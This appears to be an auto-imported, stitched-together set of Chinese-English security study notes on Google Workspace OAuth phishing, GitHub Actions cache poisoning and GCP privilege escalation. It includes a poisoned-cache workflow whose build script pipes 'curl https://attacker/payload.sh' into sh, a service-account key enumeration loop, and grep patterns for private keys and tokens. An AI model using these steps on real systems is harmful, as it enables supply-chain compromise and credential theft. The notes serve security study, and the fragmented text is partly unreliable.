might be able to access https://vault.google.com and 下载 all the information. From https://contacts.google.com you can 下载 all the contacts of the user. # 工具与参考入口 https://groups.google.com/all-groups https://takeout.google.com https://vault.google.com https://contacts.google.com https://cloudsearch.google.com/ https://mail.google.com/chat PaperChaser https://keep.google.com/ https://script.google.com/ https://admin.google.com/ https://admin.google.com/ac/emaillogsearch https://www.youtube-nocookie.com/embed/6AsVUS79gLw https://www.youtube.com/watch?v=KTVHLolz6cE # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Then, the people will only see their warning about a meeting in 5mins and that they need to read that link. The with some code like the following an attacker could make the script load arbitrary content in this page without stop accessing the domain: It's possible to create App Scripts attached to documents to try to get access over a victims OAuth 令牌，for more information check: Any of the previous techniques might be used to make the user access a Google OAuth application that will request the user some access. If the user trusts the source he might trust the application (even if it's asking for high privileged permissions). Google allows to create applications that can interact on behalf users with several Google services: Gmail, Drive, GCP... When creating an application to act on behalf other users, the developer needs to create an OAuth app inside GCP and indicate the scopes (permissions) the app needs to access the users data.\ Use any scope that can access private data (Gmail, Drive, GCP, BigQuery...) cloud-platform: View and manage your data across Google Cloud Platform services. You can impersonate the user in GCP. admin.directory.user.readonly: See and 下载 your organization's GSuite directory. Get names, phones, calendar URLs of all the users. Internal might be interesting you have already compromised a user of the organization and you are creating this App to phish another one. Both admin.directory.user.readonly and cloud-platform are sensitive permissions. 检测 ideas (new/rare app + risky scopes): https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.readonly # 命令 / 载荷 / 操作片段 # 1. At the moment of this writing this service is in beta and it supports 2 types of synchronization: From Active Directory 域 and from Azure Entra ID: Azure Entra ID: To configure this it's just needed to login in Azure with a user with read access over the Entra ID subscription in a pop-up showed by Google, and Google will keep the 令牌 with read access over Entra ID. However, notice that the passwords the users might be using in Workspace could be the same ones or not. Users might be reusing the 密码 or not from AD or EntraID, but this mean that you will need to compromise the passwords of the users to login. If you have access to the mails of the users, you could change the Workspace 密码 of an existing user, or create a new user, wait until it gets synchronized an setup the account. title: GH Actions：Cache Poisoning 技术笔记
content: 来源路径： 02-知识点/云与容器/GH Actions：Cache Poisoning 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # GH Actions：Cache Poisoning 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 GH Actions：Cache Poisoning 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 GH Actions：Cache Poisoning 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：GH Actions：Cache Poisoning、Overview、Attack primitives、Example 利用 chain、Poisoning mechanics；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 GH Actions：Cache Poisoning Overview Attack primitives Example 利用 chain Poisoning mechanics Practical 利用 tips Newer techniques seen in the Angular (2026) chain Demo Vulnerable workflow (untrusted trigger can save cache) Privileged workflow (restores and executes cached binary/script) Run the lab What this demonstrates technically Defensive verification checklist # 核心要点 Cache entries are identified solely by the key. Broad restore-keys make it easy to inject 载荷 because the attacker only needs to collide with a prefix. The cached filesystem is restored verbatim. If the cache contains scripts or binaries that are executed later, the attacker controls that execution path. The cache file itself is not validated on restore; it is just a zstd-compressed archive, so a poisoned entry can overwrite scripts, package.json, or other files under the restore path. Privileged workflow restored and executed the poisoned cache: The second job now runs attacker-controlled code while holding release 凭据 (PyPI tokens, PATs, cloud deploy keys, etc.). GitHub Actions cache entries are typically zstd-compressed tar archives. You can craft one locally and 上传 it to the cache: Target workflows triggered by pull request target, issue comment, or bot commands that still save caches; GitHub lets them overwrite repository-wide keys even when the runner only has read access to the repo. Look for deterministic cache keys reused across trust boundaries (for example, pip-${{ hashFiles('poetry.lock') }}) or permissive restore-keys, then save your malicious tarball before the privileged workflow runs. Monitor logs for Cache saved entries or add your own cache-save step so the next release job restores the 载荷 and executes the trojanized scripts or binaries. Cache v2 "prefix hit" behavior: In Cache v2, exact misses can still restore another entry sharing the same key prefix (effectively "all keys are restore keys"). Attackers can pre-seed near-collision keys so a future miss falls back to the poisoned object. Detect and use runtime cache context from the runner (ACTIONS RUNTIME 令牌 and cache service URL). Enumerate and target candidate cache keys/versions used by downstream workflows. Force eviction by overfilling cache quota (when applicable) and then writing attacker-controlled entries in the same run. Seed poisoned cache content so later workflows restore and execute modified tooling. # 命令 / 载荷 / 操作片段 # 1. Example 利用 chain 123456789steps: - run: | mkdir -p toolchain/bin printf '#!/bin/sh\ncurl https://attacker/payload.sh | sh\n' > toolchain/bin/build chmod +x toolchain/bin/build - uses: actions/cache/save@v4 with: path: toolchain key: linux-build-${{ hashFiles('toolchain.lock') }} # 2. Example 利用 chain 123456steps: - uses: actions/cache/restore@v4 with: path: toolchain key: linux-build-${{ hashFiles('toolchain.lock') }} - run: toolchain/bin/build release.tar.gz # 3. Poisoning mechanics 1tar --zstd -cf poisoned_cache.tzstd cache/contents/here # 4. Vulnerable workflow (untrusted trigger can save cache) 1234567891011121314151617181920212223242526name: untrusted-cache-writeron: pull_request_target: types: [opened, synchronize, reopened]permissions: contents: readjobs: poison: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Build "toolchain" from untrusted context (demo) run: | mkdir -p toolchain/bin cat > toolchain/bin/build << 'EOF' #!/usr/bin/env bash echo "POISONED_BUILD_PATH" echo "workflow=${GITHUB_WORKFLOW}" > /tmp/cache-poisoning-demo.txt EOF chmod +x toolchain/bin/build - uses: actions/cache/save@v4 with: path: toolchain key: linux-build-${{ hashFiles('toolchain.lock') }} # 5. Privileged workflow (restores and executes cached binary/script) 123456789101112131415161718192021name: privileged-consumeron: workflow_dispatch:permissions: contents: readjobs: release_like_job: runs-on: ubuntu-latest env: DEMO_SECRET: ${{ secrets.DEMO_SECRET }} steps: - uses: actions/cache/restore@v4 with: path: toolchain key: linux-build-${{ hashFiles('toolchain.lock') }} - name: Execute cached build tool run: | ./toolchain/bin/build test -f /tmp/cache-poisoning-demo.txt &&am

title: GCP：权限提升
content: 来源路径： 02-知识点/云与容器/GCP：权限提升.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # GCP：权限提升 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 GCP：权限提升 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 GCP：权限提升 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Introduction to GCP 权限提升 <a href="#introduction-to-gcp-privilege-escalation" id="introduction-to-gcp-privilege-escalation"></a>、Permissions for 权限提升 方法论、Bypassing access scopes <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>、权限提升 Techniques、Abusing GCP to escalate privileges locally；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Introduction to GCP 权限提升 <a href="#introduction-to-gcp-privilege-escalation" id="introduction-to-gcp-privilege-escalation"></a> Permissions for 权限提升 方法论 Bypassing access scopes <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a> 权限提升 Techniques Abusing GCP to escalate privileges locally # 核心要点 GCP, as any other cloud, have some principals: users, groups and service accounts, and some resources like compute engine, cloud functions…\ Then, via roles, permissions are granted to those principals over the resources. This is the way to specify the permissions a principal has over a resource in GCP.\ There are certain permissions that will allow a user to get even more permissions on the resource or third party resources, and that’s what is called 权限提升 (also, the 利用 the vulnerabilities to get more permissions). Therefore, I would like to separate GCP 权限提升 techniques in 2 groups: Privesc to a principal: This will allow you to impersonate another principal, and therefore act like it with all his permissions. e.g.: Abuse getAccessToken to impersonate a service account. It's important to note also that in GCP Service Accounts are both principals and permissions, so escalating privileges in a SA will allow you to impersonate it also. The subpages of this section are ordered by services. You can find on each service different ways to escalate privileges on the services. # 命令 / 载荷 / 操作片段 # 1. Bypassing access scopes <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a> 1234for i in $(gcloud iam service-accounts list --format="tableno-heading"); do echo "Looking for keys for $i:" gcloud iam service-accounts keys list --iam-account $idone # 工具与参考入口 https://github.com/carlospolop/gcp privesc scripts access scopes scope # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Amazingly, GPC permissions of the compute engine you have compromised may help you to escalate privileges locally inside a machine. Even if that won't always be very helpful in a cloud environment, it's good to know it's possible. Compute Instances are probably there to execute some scripts to perform actions with their service accounts. As IAM is go granular, an account may have read/write privileges over a resource but no list privileges. A great hypothetical example of this is a Compute Instance that has permission to read/write backups to a storage bucket called instance82736-long-term-xyz-archive-0332893. Moreover, it's possible to add userdata, which is a script that will be executed everytime the machine is started or restarted and that can be accessed from the metadata endpoint also. ~/.config/gcloud/ 凭据.db ~/.config/gcloud/legacy 凭据 /[ACCOUNT]/adc.json ~/.config/gcloud/legacy 凭据 /[ACCOUNT]/.boto ~/. 凭据.json # 命令 / 载荷 / 操作片段 # 1. Search for Keys in the filesystem 1sudo find / -name "gcloud" # 2. More API Keys regexes 1234567891011121314151617181920212223242526272829TARGET_DIR="/path/to/whatever"# Service account keysgrep -Pzr "(?s){[^{}]*?service_account[^{}]*?private_key.*?}" \ "$TARGET_DIR"# Legacy GCP credsgrep -Pzr "(?s){[^{}]*?client_id[^{}]*?client_secret.*?}" \ "$TARGET_DIR"# Google API keysgrep -Pr "AIza[a-zA-Z0-9\\-_]{35}" \ "$TARGET_DIR"# Google OAuth tokensgrep -Pr "ya29\.[a-zA-Z0-9_-]{100,200}" \ "$TARGET_DIR"# Generic SSH keysgrep -Pzr "(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[a-zA-Z0-9/\+=\n-]*?END[ A-Z]*?PRIVATE KEY-----" \ "$TARGET_DIR"# Signed storage URLsgrep -Pir "storage.googleapis.com.*?Goog-Signature=[a-f0-9]+" \ "$TARGET_DIR"# Signed policy documents in HTMLgrep -Pzr '(?s)<form action.*?googleapis.com.*?name="signature" value=".*?">' \ "$TARGET_DIR" # 工具与参考入口 custom metadata # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
